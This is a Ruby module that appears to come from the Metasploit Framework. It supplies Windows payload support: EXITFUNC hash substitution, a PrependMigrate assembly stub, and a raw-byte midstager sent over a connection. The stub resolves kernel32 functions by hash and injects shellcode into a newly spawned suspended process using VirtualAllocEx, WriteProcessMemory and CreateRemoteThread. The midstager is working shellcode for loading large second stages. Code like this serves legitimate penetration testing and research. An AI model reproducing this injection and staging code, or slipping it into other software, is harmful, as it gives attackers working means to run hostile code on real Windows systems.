# -*- coding: binary -*-
require 'msf/core'

###
#
# This class is here to implement advanced variable substitution
# for windows-based payloads, such as EXITFUNC.  Windows payloads
# are expected to include this module if they want advanced
# variable substitution.
#
###
module Msf::Payload::Windows

	#
	# ROR hash associations for some of the exit technique routines.
	#
	@@exit_types =
		{
			'seh'     => 0xEA320EFE, # SetUnhandledExceptionFilter
			'thread'  => 0x0A2A1DE0, # ExitThread
			'process' => 0x56A2B5F0, # ExitProcess
			'none'    => 0x5DE2C5AA, # GetLastError
		}

	#
	# This mixin is chained within payloads that target the Windows platform.
	# It provides special variable substitution for things like EXITFUNC and
	# automatically adds it as a required option for exploits that use windows
	# payloads. It also provides the migrate prepend.
	#
	def initialize(info = {})
		ret = super( info )

		# All windows payload hint that the stack must be aligned to nop
		# generators and encoders.
		if( info['Arch'] == ARCH_X86_64 )
			if( info['Alias'] )
				info['Alias'] = 'windows/x64/' + info['Alias']
			end
			merge_info( info, 'SaveRegisters' => [ 'rsp' ] )
		elsif( info['Arch'] == ARCH_X86 )
			if( info['Alias'] )
				info['Alias'] = 'windows/' + info['Alias']
			end
			merge_info( info, 'SaveRegisters' => [ 'esp' ] )
		end

		#if (info['Alias'])
		#	info['Alias'] = 'windows/' + info['Alias']
		#end

		register_options(
			[
				Msf::OptRaw.new('EXITFUNC', [ true, "Exit technique: #{@@exit_types.keys.join(", ")}", 'process' ])
			], Msf::Payload::Windows )
		register_advanced_options(
			[
				Msf::OptBool.new('PrependMigrate', [ true, "Spawns and runs shellcode in new process", false ]),
				Msf::OptString.new('PrependMigrateProc', [ false, "Process to spawn and run shellcode in" ])
			], Msf::Payload::Windows )
		ret
	end

	#
	# Overload the generate() call to prefix our stubs
	#
	def generate(*args)
		# Call the real generator to get the payload
		buf = super(*args)
		pre = ''

		test_arch = [ *(self.arch) ]

		# Handle all x86 code here
		if (test_arch.include?(ARCH_X86))

			# PrependMigrate
			if (datastore['PrependMigrate'])
				payloadsize = "0x%04x" % buf.length
				procname = datastore['PrependMigrateProc'] || 'rundll32'

				# Prepare instructions to get address of block_api into ebp
				block_api_start = <<EOS
  call start
EOS
				block_api_asm = <<EOS
api_call:
  pushad                    ; We preserve all the registers for the caller, bar EAX and ECX.
  mov ebp, esp              ; Create a new stack frame
  xor edx, edx              ; Zero EDX
  mov edx, [fs:edx+48]      ; Get a pointer to the PEB
  mov edx, [edx+12]         ; Get PEB->Ldr
  mov edx, [edx+20]         ; Get the first module from the InMemoryOrder module list
next_mod:                   ;
  mov esi, [edx+40]         ; Get pointer to modules name (unicode string)
  movzx ecx, word [edx+38]  ; Set ECX to the length we want to check 
  xor edi, edi              ; Clear EDI which will store the hash of the module name
loop_modname:               ;
  xor eax, eax              ; Clear EAX
  lodsb                     ; Read in the next byte of the name
  cmp al, 'a'               ; Some versions of Windows use lower case module names
  jl not_lowercase          ;
  sub al, 0x20              ; If so normalise to uppercase
not_lowercase:              ;
  ror edi, 13               ; Rotate right our hash value
  add edi, eax              ; Add the next byte of the name
  loop loop_modname         ; Loop untill we have read enough
  ; We now have the module hash computed
  push edx                  ; Save the current position in the module list for later
  push edi                  ; Save the current module hash for later
  ; Proceed to iterate the export address table, 
  mov edx, [edx+16]         ; Get this modules base address
  mov eax, [edx+60]         ; Get PE header
  add eax, edx              ; Add the modules base address
  mov eax, [eax+120]        ; Get export tables RVA
  test eax, eax             ; Test if no export address table is present
  jz get_next_mod1          ; If no EAT present, process the next module
  add eax, edx              ; Add the modules base address
  push eax                  ; Save the current modules EAT
  mov ecx, [eax+24]         ; Get the number of function names  
  mov ebx, [eax+32]         ; Get the rva of the function names
  add ebx, edx              ; Add the modules base address
  ; Computing the module hash + function hash
get_next_func:              ;
  jecxz get_next_mod        ; When we reach the start of the EAT (we search backwards), process the next module
  dec ecx                   ; Decrement the function name counter
  mov esi, [ebx+ecx*4]      ; Get rva of next module name
  add esi, edx              ; Add the modules base address
  xor edi, edi              ; Clear EDI which will store the hash of the function name
  ; And compare it to the one we want
loop_funcname:              ;
  xor eax, eax              ; Clear EAX
  lodsb                     ; Read in the next byte of the ASCII function name
  ror edi, 13               ; Rotate right our hash value
  add edi, eax              ; Add the next byte of the name
  cmp al, ah                ; Compare AL (the next byte from the name) to AH (null)
  jne loop_funcname         ; If we have not reached the null terminator, continue
  add edi, [ebp-8]          ; Add the current module hash to the function hash
  cmp edi, [ebp+36]         ; Compare the hash to the one we are searchnig for 
  jnz get_next_func         ; Go compute the next function hash if we have not found it
  ; If found, fix up stack, call the function and then value else compute the next one...
  pop eax                   ; Restore the current modules EAT
  mov ebx, [eax+36]         ; Get the ordinal table rva      
  add ebx, edx              ; Add the modules base address
  mov cx, [ebx+2*ecx]       ; Get the desired functions ordinal
  mov ebx, [eax+28]         ; Get the function addresses table rva  
  add ebx, edx              ; Add the modules base address
  mov eax, [ebx+4*ecx]      ; Get the desired functions RVA
  add eax, edx              ; Add the modules base address to get the functions actual VA
  ; We now fix up the stack and perform the call to the desired function...
finish:
  mov [esp+36], eax         ; Overwrite the old EAX value with the desired api address for the upcoming popad
  pop ebx                   ; Clear off the current modules hash
  pop ebx                   ; Clear off the current position in the module list
  popad                     ; Restore all of the callers registers, bar EAX, ECX and EDX which are clobbered
  pop ecx                   ; Pop off the origional return address our caller will have pushed
  pop edx                   ; Pop off the hash value our caller will have pushed
  push ecx                  ; Push back the correct return value
  jmp eax                   ; Jump into the required function
  ; We now automagically return to the correct caller...
get_next_mod:               ;
  pop eax                   ; Pop off the current (now the previous) modules EAT
get_next_mod1:              ;
  pop edi                   ; Pop off the current (now the previous) modules hash
  pop edx                   ; Restore our position in the module list
  mov edx, [edx]            ; Get the next module
  jmp.i8 next_mod           ; Process this module
;--------------------------------------------------------------------------------------
EOS
				block_api_ebp_asm = <<EOS
  pop ebp                   ; Pop off the address of 'api_call' for calling later.
EOS
				block_close_to_payload = ''

				# Check if we can find block_api in the payload
				block_api = Metasm::Shellcode.assemble(Metasm::Ia32.new, block_api_asm).encode_string
				block_api_index = buf.index(block_api)
				if block_api_index

					# Prepare instructions to calculate address
					ebp_offset = "0x%04x" % (block_api_index + 5)
					block_api_ebp_asm = <<EOS
  jmp close_to_payload
return_from_close_to_payload:
  pop ebp
  add ebp, #{ebp_offset}
EOS
					# Clear now-unneeded instructions
					block_api_asm = ''
					block_api_start = ''
					block_close_to_payload = <<EOS
close_to_payload:
  call return_from_close_to_payload
EOS
				end

				#put all pieces together
				migrate_asm = <<EOS
  cld                       ; Clear the direction flag.
  #{block_api_start}
  #{block_api_asm}
start:
  #{block_api_ebp_asm}
  ; get our own startupinfo at esp+0x60
  add esp,-400              ; adjust the stack to avoid corruption
  mov edx,esp
  add edx,0x60
  push edx
  push 0xB16B4AB1           ; hash( "kernel32.dll", "GetStartupInfoA" )
  call ebp                  ; GetStartupInfoA( &si );

  ; ptr to startupinfo is in eax
  ; pointer to string is in ecx
  jmp getcommand
  gotcommand:
  pop esi                   ; esi = address of process name (command line)

  ; create the process
  mov edi,eax
  add edi,0x60              ; Offset of empty space for lpProcessInformation
  push edi                  ; lpProcessInformation : write processinfo here
  push eax                  ; lpStartupInfo : current info (read)
  xor ebx,ebx
  push ebx                  ; lpCurrentDirectory
  push ebx                  ; lpEnvironment
  push 0x08000004           ; dwCreationFlags CREATE_NO_WINDOW | CREATE_SUSPENDED
  push ebx                  ; bInHeritHandles
  push ebx                  ; lpThreadAttributes
  push ebx                  ; lpProcessAttributes
  push esi                  ; lpCommandLine
  push ebx                  ; lpApplicationName

  push 0x863FCC79           ; hash( "kernel32.dll", "CreateProcessA" )
  call ebp                  ; CreateProcessA( &si );

  ; allocate memory in the process (VirtualAllocEx())
  ; get handle
  push 0x40                 ; RWX
  add bh,0x10               ; ebx = 0x1000
  push ebx                  ; MEM_COMMIT
  push ebx                  ; size
  xor ebx,ebx
  push ebx                  ; address
  push [edi]                ; handle
  push 0x3F9287AE           ; hash( "kernel32.dll", "VirtualAllocEx" )
  call ebp                  ; VirtualAllocEx( ...);

  ; eax now contains the destination
  ; WriteProcessMemory()
  push esp                  ; lpNumberOfBytesWritten 
  push #{payloadsize}       ; nSize 
  ; pick up pointer to shellcode & keep it on stack
  jmp begin_of_payload
  begin_of_payload_return:  ; lpBuffer 
  push eax                  ; lpBaseAddress 
  push [edi]                ; hProcess 
  push 0xE7BDD8C5           ; hash( "kernel32.dll", "WriteProcessMemory" )
  call ebp                  ; WriteProcessMemory( ...);

  ; run the code (CreateRemoteThread())
  push ebx                  ; lpthreadID
  push ebx                  ; run immediately
  push ebx                  ; no parameter
  mov ecx,[esp-0x4]
  push ecx                  ; shellcode
  push ebx                  ; stacksize
  push ebx                  ; lpThreadAttributes
  push [edi] 
  push 0x799AACC6           ; hash( "kernel32.dll", "CreateRemoteThread" )
  call ebp                  ; CreateRemoteThread( ...);

  ;sleep
  push -1
  push 0xE035F044           ; hash( "kernel32.dll", "Sleep" )
  call ebp                  ; Sleep( ... );

getcommand:
  call gotcommand
  db "#{procname}"
  db 0x00
#{block_close_to_payload}
begin_of_payload:
  call begin_of_payload_return
EOS

				pre << Metasm::Shellcode.assemble(Metasm::Ia32.new, migrate_asm).encode_string
			end
		end
		return (pre + buf)
	end

	#
	# Replace the EXITFUNC variable like madness
	#
	def replace_var(raw, name, offset, pack)
		if (name == 'EXITFUNC')
			method = datastore[name]
			method = 'thread' if (!method or @@exit_types.include?(method) == false)

			raw[offset, 4] = [ @@exit_types[method] ].pack(pack || 'V')

			return true
		end

		return false
	end

	#
	# For windows, we check to see if the stage that is being sent is larger
	# than a certain size.  If it is, we transmit another stager that will
	# ensure that the entire stage is read in.
	#
	def handle_intermediate_stage(conn, payload)
		if( self.module_info['Stager']['RequiresMidstager'] == false )
			conn.put( [ payload.length ].pack('V') )
			# returning false allows stager.rb!handle_connection() to prepend the stage_prefix if needed
			return false
		end

		return false if (payload.length < 512)

		# The mid-stage works by reading in a four byte length in host-byte
		# order (which represents the length of the stage). Following that, it
		# reads in the entire second stage until all bytes are read. It reads the
		# data into a buffer which is allocated with VirtualAlloc to avoid running
		# out of stack space or NX problems.
		# See the source file: /external/source/shellcode/windows/midstager.asm
		midstager =
			"\xfc\x31\xdb\x64\x8b\x43\x30\x8b\x40\x0c\x8b\x50\x1c\x8b\x12\x8b" +
			"\x72\x20\xad\xad\x4e\x03\x06\x3d\x32\x33\x5f\x32\x0f\x85\xeb\xff" +
			"\xff\xff\x8b\x6a\x08\x8b\x45\x3c\x8b\x4c\x05\x78\x8b\x4c\x0d\x1c" +
			"\x01\xe9\x8b\x71\x3c\x01\xee\x60\x64\x8b\x5b\x30\x8b\x5b\x0c\x8b" +
			"\x5b\x14\x8b\x73\x28\x6a\x18\x59\x31\xff\x31\xc0\xac\x3c\x61\x7c" +
			"\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x81\xff\x5b\xbc\x4a\x6a" +
			"\x8b\x6b\x10\x8b\x1b\x75\xdb\x8b\x45\x3c\x8b\x7c\x05\x78\x01\xef" +
			"\x8b\x4f\x18\x8b\x5f\x20\x01\xeb\x49\x8b\x34\x8b\x01\xee\x31\xc0" +
			"\x99\xac\x84\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf4\x81\xfa\x54" +
			"\xca\xaf\x91\x75\xe3\x8b\x5f\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5f" +
			"\x1c\x01\xeb\x8b\x1c\x8b\x01\xeb\x89\x5c\x24\x08\x61\x89\xe3\x6a" +
			"\x00\x6a\x04\x53\x57\xff\xd6\x8b\x1b\x6a\x40\x68\x00\x30\x00\x00" +
			"\x53\x6a\x00\xff\xd5\x89\xc5\x55\x6a\x00\x53\x55\x57\xff\xd6\x01" +
			"\xc5\x29\xc3\x85\xdb\x75\xf1\xc3"

		# Prepend the stage prefix as necessary, such as a tag that is needed to
		# find the socket
		midstager = (self.stage_prefix || '') + midstager

		print_status("Transmitting intermediate stager for over-sized stage...(#{midstager.length} bytes)")

		# Transmit our intermediate stager
		conn.put(midstager)

		# Sleep to give enough time for the remote side to receive and read the
		# midstage so that we don't accidentally read in part of the second
		# stage.
		Rex::ThreadSafe.sleep(1.5)

		# The mid-stage requires that we transmit a four byte length field that
		# it will use as the length of the subsequent stage.
		conn.put([ payload.length ].pack('V'))

		return true
	end

end

